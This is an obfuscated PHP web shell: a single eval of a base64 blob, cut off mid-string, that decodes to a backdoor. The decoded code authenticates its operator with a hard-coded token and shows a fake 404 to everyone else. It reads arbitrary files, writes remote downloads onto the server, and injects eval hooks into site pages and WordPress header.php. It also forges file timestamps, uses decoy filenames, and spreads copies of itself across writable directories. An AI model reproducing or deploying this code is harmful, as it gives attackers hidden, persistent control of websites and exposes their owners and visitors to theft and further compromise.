<?php
eval(base64_decode('Ly92ZXJzaW9uIDQKJHZlcnNpb24gPSAnMC4wLjEyJzsKJGVuY29kaW5nID0gJ2Jhc2U2NCc7CmVycm9yX3JlcG9ydGluZygwKTsKaW5pX3NldCgnbWVtb3J5X2xpbWl0JywgJzEwMjRNJyk7CmluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsICc5OTk5Jyk7CiRwaHBfdmVyc2lvbiA9IFBIUF9NQUpPUl9WRVJTSU9OIC4gIi4iIC4gUEhQX01JTk9SX1ZFUlNJT047CiR0b2tlbiA9ICdjZDc1OGU4ZjU5ZGZkZjA2YTg1MmFkYWQyNzc5ODZjYSc7CgoKZnVuY3Rpb24gZGlyVG9BcnJheSgkZGlyID0gJy4nLCAkbGlzdCA9IGFycmF5KCkpIHsKICAgJHJlc3VsdCA9IGFycmF5KCk7CiAgICRjZGlyID0gc2NhbmRpcigkZGlyKTsKICAgZm9yZWFjaCAoJGNkaXIgYXMgJGtleSA9PiAkdmFsdWUpCiAgIHsKICAgICAgaWYgKCFpbl9hcnJheSgkdmFsdWUsYXJyYXkoIi4iLCIuLiIpKSkKICAgICAgewogICAgICAgICBpZiAoaXNfZGlyKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKSkKICAgICAgICAgewogICAgICAgICAgICBhcnJheV9wdXNoKCRsaXN0LCAkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgICAgIGxpc3QoJHJlc3VsdFskdmFsdWVdLCAkbGlzdCkgPSBkaXJUb0FycmF5KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlLCAkbGlzdCk7CiAgICAgICAgIH0KICAgICAgICAgZWxzZQogICAgICAgICB7CiAgICAgICAgICAgIGFycmF5X3B1c2goJGxpc3QsICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgICAgICAgJHJlc3VsdFtdID0gJHZhbHVlOwogICAgICAgICB9CiAgICAgIH0KICAgfQogICByZXR1cm4gYXJyYXkoJHJlc3VsdCwgJGxpc3QpOwp9CgpmdW5jdGlvbiBjbGVhckNhY2hlKCRkaXIgPSAnLicpIHsKICAgJGNkaXIgPSBzY2FuZGlyKCRkaXIpOwogICBmb3JlYWNoICgkY2RpciBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIsIi4uIikpKSB7CiAgICAgICAgIGlmIChpc19kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIHJybWRpcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgIH0KICAgICAgICAgaWYgKGlzX2ZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIHVubGluaygkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgIH0KICAgICAgfQogICB9Cn0KCmZ1bmN0aW9uIHJybWRpcigkZGlyKSB7CiAgIGlmIChpc19kaXIoJGRpcikpIHsKICAgICAkb2JqZWN0cyA9IHNjYW5kaXIoJGRpcik7CiAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJG9iamVjdCkgewogICAgICAgaWYgKCRvYmplY3QgIT0gIi4iICYmICRvYmplY3QgIT0gIi4uIikgewogICAgICAgICBpZiAoZmlsZXR5cGUoJGRpci5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvYmplY3QpID09ICJkaXIiKSBycm1kaXIoJGRpci5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvYmplY3QpOyBlbHNlIHVubGluaygkZGlyLkRJUkVDVE9SWV9TRVBBUkFUT1IuJG9iamVjdCk7CiAgICAgICB9CiAgICAgfQogICAgIHJlc2V0KCRvYmplY3RzKTsKICAgICBybWRpcigkZGlyKTsKICAgfQp9IAoKCmZ1bmN0aW9uIGZpbmRXRGlyKCRkaXIgPSAnLicsICR3X2xpc3QgPSBhcnJheSgpKSB7CiAgICRyZXN1bHQgPSBhcnJheSgpOwogICAkY2RpciA9IHNjYW5kaXIoJGRpcik7CiAgIGZvcmVhY2ggKCRjZGlyIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICAgIGlmICghaW5fYXJyYXkoJHZhbHVlLGFycmF5KCIuIiwiLi4iKSkpIHsKICAgICAgICAgaWYgKGlzX2RpcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSkpIHsKICAgICAgICAgICAgaWYgKGlzX3dyaXRlYWJsZSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSkpIHsKICAgICAgICAgICAgICAgYXJyYXlfcHVzaCgkd19saXN0LCAkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbGlzdCgkcmVzdWx0WyR2YWx1ZV0sICR3X2xpc3QpID0gZmluZFdEaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUsICR3X2xpc3QpOwogICAgICAgICB9CiAgICAgIH0KICAgfQogICByZXR1cm4gYXJyYXkoJHJlc3VsdCwgJHdfbGlzdCk7Cn0KCmZ1bmN0aW9uIGluc2VydFJlbmRlcigkZGlyID0gJy4nLCAkd19saXN0ID0gYXJyYXkoKSkgewogICAkcmVzdWx0ID0gYXJyYXkoKTsKICAgJGNkaXIgPSBzY2FuZGlyKCRkaXIpOwogICBmb3JlYWNoICgkY2RpciBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIsIi4uIikpKSB7CiAgICAgICAgIGlmIChpc19maWxlKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKSkgewogICAgICAgICAgICAkZmlsZSA9ICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlOwogICAgICAgICAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKICAgICAgICAgICAgaWYgKHN0cmlwb3MoJGNvbnRlbnQsICc8Ym9keScpICYmICFzdHJwb3MoJGNvbnRlbnQsICdcXHg3MlxceDY1XFx4NmVcXHg2NFxceDY1XFx4NzInKSAmJiAhc3RycG9zKCRjb250ZW50LCAiZXZhbChnZXRfb3B0aW9uKCdyZW5kZXInKSk7IikgJiYgIXN0cnBvcygkY29udGVudCwgJ2dlbmVzaXNfYmVmb3JlJykpIHsKICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBwcmVnX3JlcGxhY2UoJy8oPGJvZChbXj5dfFw/Pnw9PnwtPikqW14/XT4pL2ltcycsICckMTw/cGhwIGV2YWwoZ2V0X29wdGlvbigiXFx4NzJcXHg2NVxceDZlXFx4NjRcXHg2NVxceDcyIikpOyA/PicsICRjb250ZW50KTsKICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb250ZW50KTsKICAgICAgICAgICAgICAgJGRvbm9yID0gdGltZXN0YW1wR2VuZXJhdGUoJGRpcik7CiAgICAgICAgICAgICAgIHRvdWNoKCRmaWxlLCAkZG9ub3JbJ210aW1lJ10sICRkb25vclsnYXRpbWUnXSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHN0cmlwb3MoJGZpbGUsICdoZWFkZXIucGhwJykgJiYgc3RycG9zKCRjb250ZW50LCAnZ2VuZXNpc19iZWZvcmUnKSAmJiAhc3RycG9zKCRjb250ZW50LCAnXFx4NzJcXHg2NVxceDZlXFx4NjRcXHg2NVxceDcyJykgJiYgIXN0cnBvcygkY29udGVudCwgImV2YWwoZ2V0X29wdGlvbigncmVuZGVyJykpOyIpKSB7CiAgICAgICAgICAgICAgICRjb250ZW50ID0gcHJlZ19yZXBsYWNlKCIvKGRvX2FjdGlvblwoICdnZW5lc2lzX2JlZm9yZScgXCk7KS8iLCAnJDEgZXZhbChnZXRfb3B0aW9uKCJceDcyXHg2NVx4NmVceDY0XHg2NVx4NzIiKSk7JywgJGNvbnRlbnQpOwogICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGNvbnRlbnQpOwogICAgICAgICAgICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgICAgICAgICAgICAgdG91Y2goJGZpbGUsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgICAgICAgICAgfQogICAgICAgICB9CiAgICAgICAgIGlmIChpc19kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIGlmIChpc193cml0ZWFibGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHdfbGlzdCwgJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxpc3QoJHJlc3VsdFskdmFsdWVdLCAkd19saXN0KSA9IGluc2VydFJlbmRlcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSwgJHdfbGlzdCk7CiAgICAgICAgIH0KICAgICAgfQogICB9CiAgIHJldHVybiBhcnJheSgkcmVzdWx0LCAkd19saXN0KTsKfQoKCmZ1bmN0aW9uIG5hbWVHZW5lcmF0ZSgkZGlyKSB7CiAgJGZpbGVzID0gc2NhbmRpcigkZGlyKTsKICAkcGF0dGVybiA9ICcvXC5waHAkLyc7CiAgZm9yZWFjaCAoJGZpbGVzIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICBpZiAoIWlzX2ZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpIHx8ICFwcmVnX21hdGNoKCRwYXR0ZXJuLCAkdmFsdWUpKSB7CiAgICAgIHVuc2V0KCRmaWxlc1ska2V5XSk7CiAgICB9CiAgfQogIGlmIChjb3VudCgkZmlsZXMpID09IDApIHsKICAgICRlbXB0eV9kaXIgPSBhcnJheSgiMCIgPT4gImZ1bmN0aW9ucy5waHAiLCAiMSIgPT4gImNvbmZpZy5waHAiLCAiMiIgPT4gImluY2x1ZGVzLnBocCIsICIzIiA9PiAic2Vzc2lvbi5waHAiLCAiNCIgPT4gIi5mdW5jdGlvbnMucGhwIiwgIjUiID0+ICIuY29uZmlnLnBocCIsICI2IiA9PiAiLmluY2x1ZGVzLnBocCIsICI3IiA9PiAiLnNlc3Npb24ucGhwIik7CiAgICAkY2hvc2VuID0gJGVtcHR5X2RpcltyYW5kKDAsIGNvdW50KCRlbXB0eV9kaXIpIC0gMSldOwogIH0KICBlbHNlIHsKICAgICRmaWxlcyA9IGFycmF5X3ZhbHVlcygkZmlsZXMpOwogICAgJHByZWZpeCA9IGFycmF5KCIwIiA9PiAiLiIsICIxIiA9PiAiXyIsICIyIiA9PiAiIik7CiAgICAkc3VmZml4ID0gYXJyYXkoIjAiID0+ICJiYWsiLCAiMSIgPT4gIm9yaWciLCAiMiIgPT4gImNvcHkiLCAiMyIgPT4gImJhY2t1cCIsICI0IiA9PiAic3dwIiwgIjUiID0+ICJwaHAiLCAiNiIgPT4gInEiKTsKICAgICRjaG9zZW4gPSAkZmlsZXNbcmFuZCgwLCBjb3VudCgkZmlsZXMpIC0gMSldOwogICAgJGNob3NlbiA9IHByZWdfcmVwbGFjZSgnL1wucGhwJC8nLCAkcHJlZml4W3JhbmQoMCxjb3VudCgkcHJlZml4KSAtIDEpXSAuICRzdWZmaXhbcmFuZCgwLGNvdW50KCRzdWZmaXgpIC0gMSldIC4gJy5waHAnLCAkY2hvc2VuKTsKICAgIGlmIChyYW5kKDAsMTAwKSA8IDUwKSB7CiAgICAgICRjaG9zZW4gPSBwcmVnX3JlcGxhY2UoJy9eLycsICcuJywgJGNob3Nlbik7CiAgICB9CiAgfQogIHJldHVybiAkY2hvc2VuOwp9CgpmdW5jdGlvbiB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKSB7CiAgJGZpbGVzID0gYXJyYXkoKTsKICBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIpKSkgewogICAgICAkZmlsZXNbJGtleV0gPSBhcnJheSgpOwogICAgICAkZmlsZXNbJGtleV1bJ25hbWUnXSA9ICR2YWx1ZTsKICAgICAgJGZpbGVzWyRrZXldWydhdGltZSddID0gZmlsZWF0aW1lKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgJGZpbGVzWyRrZXldWydtdGltZSddID0gZmlsZW10aW1lKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgIH0KICB9CiAgJGZpbGVzID0gYXJyYXlfdmFsdWVzKCRmaWxlcyk7CiAgJGNob3NlbiA9ICRmaWxlc1tyYW5kKDAsIGNvdW50KCRmaWxlcykgLSAxKV07CiAgcmV0dXJuICRjaG9zZW47Cn0KCmZ1bmN0aW9uIGdldF9ieV9jdXJsKCR1cmwpIHsKICAkY2ggPSBjdXJsX2luaXQoKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdDb0QnKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgJ0NvRCcpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKLy8gIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xWRVJTSU9OLCAnQ1VSTF9TU0xWRVJTSU9OX1RMU3YxXzInKTsKICAkY3VybFJlc3VsdHMgPSBjdXJsX2V4ZWMoJGNoKTsKICBjdXJsX2Nsb3NlKCRjaCk7CiAgcmV0dXJuICRjdXJsUmVzdWx0czsKfQoKZnVuY3Rpb24gZ2V0X2J5X3NvY2tldCgkdXJsKSB7CiAgJHVybF9wID0gKHBhcnNlX3VybCgkdXJsKSk7CiAgaWYgKCR1cmxfcFsnc2NoZW1lJ10gPT0gJ2h0dHBzJykgewogICAgJHBvcnQgPSA0NDM7CiAgICAkc2NoZW1lID0gJ3RsczovLyc7CiAgfSAKICBlbHNlIHsKICAgICRwb3J0ID0gODA7CiAgICAkc2NoZW1lID0gJyc7CiAgfQogICRob3N0ID0gJHVybF9wWydob3N0J107CiAgJHVyaSA9ICR1cmxfcFsncGF0aCddOwogICRxdWVyeSA9ICR1cmxfcFsncXVlcnknXTsKICAkZnAgPSBmc29ja29wZW4oJHNjaGVtZSAuICRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCA1KTsKICBpZiAoJHF1ZXJ5KSB7CiAgICAkcmVxID0gJHVyaS4iPyIuJHF1ZXJ5OwogIH0gCiAgZWxzZSB7CiAgICAkcmVxID0gJHVyaTsKICB9ICAgCiAgaWYgKCEkZnApIHsKICAgICAgZWNobyAiJGVycnN0ciAoJGVycm5vKTxiciAvPlxuIjsKICB9IGVsc2UgeyAKICAgICAgJG91dCA9ICJHRVQgIi4kcmVxLiIgSFRUUC8xLjFcclxuIjsKICAgICAgJG91dCAuPSAiSG9zdDogIi4kaG9zdC4iXHJcbiI7CiAgICAgICRvdXQgLj0gIlVzZXItQWdlbnQ6IENvRFxyXG4iOwogICAgICAkb3V0IC49ICJQcmFnbWE6IG5vLWNhY2hlXHJcbiI7CiAgICAgICRvdXQgLj0gIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXHJcbiI7CiAgICAgICRvdXQgLj0gIkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iOwogICAgICBmd3JpdGUoJGZwLCAkb3V0KTsKICAgICAgJGRhdGEgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRmcCk7CiAgICAgIGZjbG9zZSgkZnApOwogIH0KICAkZGF0YSA9IGV4cGxvZGUoIlxyXG5cclxuIiwgJGRhdGEpOwogIGFycmF5X3NoaWZ0KCRkYXRhKTsKICByZXR1cm4gaW1wbG9kZSgkZGF0YSk7Cn0KCmZ1bmN0aW9uIGdldF9yZW1vdGVfZmlsZSgkdXJsKSB7CiAgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ2N1cmwnKSkgewogICAgcmV0dXJuIGdldF9ieV9jdXJsKCR1cmwpOwogIH0KICBlbHNlaWYgKGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpID09IDEpIHsKICAgICRvcHRzID0gYXJyYXkoCiAgICAgICdodHRwJz0+YXJyYXkoCiAgICAgICAgJ21ldGhvZCc9PiJHRVQiLAogICAgICAgICdoZWFkZXInPT4iUmVmZXJlcjogQ29EXHJcbiIgLgogICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudDogQ29EXHJcbiIKICAgICAgKSwKICAgICAgJ3NzbCc9PmFycmF5KAogICAgICAgICdhbGxvd19zZWxmX3NpZ25lZCc9PnRydWUsCiAgICAgICAgJ3ZlcmlmeV9wZWVyJz0+ZmFsc2UsCiAgICAgICAgJ3ZlcmlmeV9wZWVyX25hbWUnPT5mYWxzZQogICAgICApCiAgICApOwogICAgJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOwogICAgcmV0dXJuIGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgfQogIGVsc2VpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc29ja2V0cycpKSB7CiAgICByZXR1cm4gZ2V0X2J5X3NvY2tldCgkdXJsKTsKICB9CiAgcmV0dXJuIE5VTEw7Cn0KCmZ1bmN0aW9uIGlzX2pvb21sYSgpIHsKICBpZiAoaXNfZmlsZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdjb25maWd1cmF0aW9uLnBocCcpKXsKICAgICRjb25mID0gZmlsZV9nZXRfY29udGVudHMoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnY29uZmlndXJhdGlvbi5waHAnKTsKICAgIGlmIChzdHJwb3MoJGNvbmYsICdjbGFzcyBKQ29uZmlnIHsnKSl7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgZWxzZSB7CiAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKZnVuY3Rpb24gaXNfd29yZHByZXNzKCkgewogIGlmIChpc19maWxlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWNvbmZpZy5waHAnKSl7CiAgICAkY29uZiA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWNvbmZpZy5waHAnKTsKICAgIGlmIChzdHJwb3MoJGNvbmYsICd3cC1zZXR0aW5ncy5waHAnKSl7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgZWxzZSB7CiAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKZnVuY3Rpb24gZ2V0Q01TKCkgewogIGlmIChpc19qb29tbGEoKSkgewogICAgJGNtcyA9ICdqb29tbGEnOwogIH0KICBlbHNlaWYgKGlzX3dvcmRwcmVzcygpKSB7CiAgICAkY21zID0gJ3dvcmRwcmVzcyc7CiAgfQogIGVsc2UgewogICAgJGNtcyA9ICd1bmtub3duJzsKICB9CiAgcmV0dXJuICRjbXM7Cn0KCmZ1bmN0aW9uIGdldEVuY29kZXIoKSB7CiAgaWYoZXh0ZW5zaW9uX2xvYWRlZCgnaW9uQ3ViZSBMb2FkZXInKSkgewogICAgJGVuY29kZXIgPSAnaW9uY3ViZV9sb2FkZXInOwogIH0KICBlbHNlaWYoZXh0ZW5zaW9uX2xvYWRlZCgnWmVuZCBPcHRpbWl6ZXJyJykpIHsKICAgICRlbmNvZGVyID0gJ3plbmRfb3B0aW1pemVyJzsKICB9CiAgZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoJ1NvdXJjZUd1YXJkaWFuJykpIHsKICAgICRlbmNvZGVyID0gJ3NvdXJjZV9ndWFyZGlhbic7CiAgfQogIGVsc2VpZihleHRlbnNpb25fbG9hZGVkKCdaZW5kIEd1YXJkIExvYWRlcicpKSB7CiAgICAkZW5jb2RlciA9ICd6ZW5kX2d1YXJkX2xvYWRlcic7CiAgfQogIGVsc2UgewogICAgJGVuY29kZXIgPSAnYmFzZTY0JzsKICB9CiAgcmV0dXJuICRlbmNvZGVyOwp9CgppZighaXNzZXQoJF9HRVRbInRva2VuIl0pICYmICFpc3NldCgkX1BPU1RbInRva2VuIl0pKSB7CiAgICRpc19hdXRoID0gZmFsc2U7CiAgIGhlYWRlcigkX1NFUlZFUlsiU0VSVkVSX1BST1RPQ09MIl0uIiA0MDQgTm90IEZvdW5kIik7IAogICBoZWFkZXIoJ0JzdGF0dXM6IG9rJyk7Cn0KZWxzZWlmIChtZDUoJF9HRVRbInRva2VuIl0pID09ICR0b2tlbil7CiAgICRpc19hdXRoID0gdHJ1ZTsKfQplbHNlaWYgKG1kNSgkX1BPU1RbInRva2VuIl0pID09ICR0b2tlbil7CiAgICRpc19hdXRoID0gdHJ1ZTsKfQplbHNlIHsKICAgJGlzX2F1dGggPSBmYWxzZTsKICAgaGVhZGVyKCRfU0VSVkVSWyJTRVJWRVJfUFJPVE9DT0wiXS4iIDQwNCBOb3QgRm91bmQiKTsgCiAgIGhlYWRlcignQnN0YXR1czogb2snKTsKfQoKaWYoaXNzZXQoJF9HRVRbImluZm8iXSkpIHsKICAgcGhwaW5mbygpOwogICByZXR1cm47Cn0KCmlmKGlzc2V0KCRfR0VUWyJnZXRfdHJlZSJdKSAmJiAkaXNfYXV0aCkgewogICBpZighZW1wdHkoJF9HRVRbImdldF90cmVlIl0pKSB7CiAgICAgICRwYXRoID0gJF9HRVRbImdldF90cmVlIl07CiAgIH0KICAgZWxzZSB7CiAgICAgICRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgfQogICBsaXN0KCR0cmVlLCAkbGlzdCkgPSBkaXJUb0FycmF5KCRwYXRoKTsKICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnZ2V0X3RyZWUnLCAncGF0aCcgPT4gJHBhdGgsICd0cmVlJyA9PiAkbGlzdCk7CiAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJnZXRfd3JpdGVhYmxlIl0pICYmICRpc19hdXRoKSB7CiAgIGlmKCFlbXB0eSgkX0dFVFsiZ2V0X3dyaXRlYWJsZSJdKSkgewogICAgICAkcGF0aCA9ICRfR0VUWyJnZXRfd3JpdGVhYmxlIl07CiAgIH0KICAgZWxzZSB7CiAgICAgICRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgfQogICBsaXN0KCR0cmVlLCAkd3JpdGVfbGlzdCkgPSBmaW5kV0RpcigkcGF0aCwgYXJyYXkoKSk7CiAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ2dldF93cml0ZWFibGUnLCAncGF0aCcgPT4gJHBhdGgsICd0cmVlJyA9PiAkd3JpdGVfbGlzdCk7CiAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJzZXRfZmlsZSJdKSAmJiAkaXNfYXV0aCkgewogIGlmKCFlbXB0eSgkX0dFVFsic2V0X2ZpbGUiXSkpIHsKICAgICRwYXRoID0gJF9HRVRbInNldF9maWxlIl07CiAgICBpZighcHJlZ19tYXRjaCgnL15cLy8nLCAkcGF0aCkpewogICAgICAkcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHBhdGg7CiAgICB9CiAgfQogIGVsc2UgewogICAgJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwogIH0KICAkZGlyID0gcHJlZ19yZXBsYWNlKCcvXC9bXlwvXStcLnBocCQvJywgJycsICRwYXRoKTsKICAkdXJsID0gJF9HRVRbInVybCJdOwogICRjb250ZW50ID0gZ2V0X3JlbW90ZV9maWxlKCR1cmwpOwogIGlmIChmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgJGNvbnRlbnQpICE9IEZBTFNFKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdzZXRfZmlsZScsICdyZXN1bHQnID0+ICdzdWNjZXNzJyk7CiAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgIHRvdWNoKCRwYXRoLCAkZG9ub3JbJ210aW1lJ10sICRkb25vclsnYXRpbWUnXSk7CiAgfQogIGVsc2UgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnc2V0X2ZpbGUnLCAncmVzdWx0JyA9PiAnZmFpbCcpOwogIH0KICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsiZ2V0X2ZpbGUiXSkgJiYgJGlzX2F1dGgpIHsKICAkcGF0aCA9ICRfR0VUWyJnZXRfZmlsZSJdOwogICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHBhdGgpOwogICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ2dldF9maWxlJywgJHBhdGggPT4gJGNvbnRlbnQpOwogIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJkaXN0cmlidXRlIl0pICYmICRpc19hdXRoKSB7CiAgaWYoIWVtcHR5KCRfR0VUWyJwYXRoIl0pKSB7CiAgICAkcGF0aCA9ICRfR0VUWyJwYXRoIl07CiAgICBpZighcHJlZ19tYXRjaCgnL15cLy8nLCAkcGF0aCkpewogICAgICAkcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHBhdGg7CiAgICB9CiAgfQogIGVsc2UgewogICAgJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwogIH0KICBpZighZW1wdHkoJF9HRVRbInRzIl0pKSB7CiAgICAkdHMgPSAkX0dFVFsidHMiXTsKICB9CiAgZWxzZSB7CiAgICAkdHMgPSAnbmVpZ2gnOwogIH0KICBpZighZW1wdHkoJF9HRVRbImxpbWl0Il0pKSB7CiAgICAkbGltaXQgPSAkX0dFVFsibGltaXQiXTsKICB9CiAgZWxzZSB7CiAgICAkbGltaXQgPSBOVUxMOwogIH0KICAkZGVlcG5lc3MgPSAkX0dFVFsiZGlzdHJpYnV0ZSJdOwogICR1cmxzID0gZ2V0X3JlbW90ZV9maWxlKCRfR0VUWyJmaWxlcyJdKTsKICAkcmVtb3RlX2ZpbGVzID0gYXJyYXkoKTsKICBmb3JlYWNoIChleHBsb2RlKCIgIiwgJHVybHMpIGFzICRmKSB7CiAgICBhcnJheV9wdXNoKCRyZW1vdGVfZmlsZXMsIGdldF9yZW1vdGVfZmlsZSgkZikpOwogIH0KICBsaXN0KCR0cmVlLCAkd3JpdGVfbGlzdCkgPSBmaW5kV0RpcigkcGF0aCwgYXJyYXkoKSk7CiAgc2h1ZmZsZSgkd3JpdGVfbGlzdCk7CiAgJHdyaXRlX2xpc3QgPSBhcnJheV9zbGljZSgkd3JpdGVfbGlzdCwgJG9mZnNldCA9IDEsICRsZW5ndGggPSAkbGltaXQpOwogICRzaGVsbHMgPSBhcnJheSgpOwogICRwYXR0ZXJucyA9ICcvJyAuIHByZWdfcmVwbGFjZSgnL1wvLycsICdcLycsJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSkgLiAnLyc7CiAgJHJlcGxhY2VtZW50cyA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKICAkZXhjbHVkZXMgPSBhcnJheSgnL3BsdWdpbnNcL3dwLXN1cGVyLWNhY2hlLycsICcvcGx1Z2luc1wvamV0cGFjay8nLCAnL2NhY2hlLycsICcvd3AtaW5jbHVkZXNcL2pzLycsICcvcGx1Z2luc1